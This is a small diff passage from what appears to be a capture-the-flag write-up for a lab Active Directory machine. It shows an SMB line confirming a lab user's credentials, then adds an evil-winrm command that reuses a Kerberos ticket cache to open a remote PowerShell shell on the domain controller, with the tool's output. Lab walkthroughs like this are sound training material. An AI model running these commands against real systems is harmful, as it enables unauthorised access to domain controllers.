@@ -308,5 +308,14 @@ SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri:Zer0
 Ill then generate another one in my current directory
 
 ```python
-
+KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
 ```
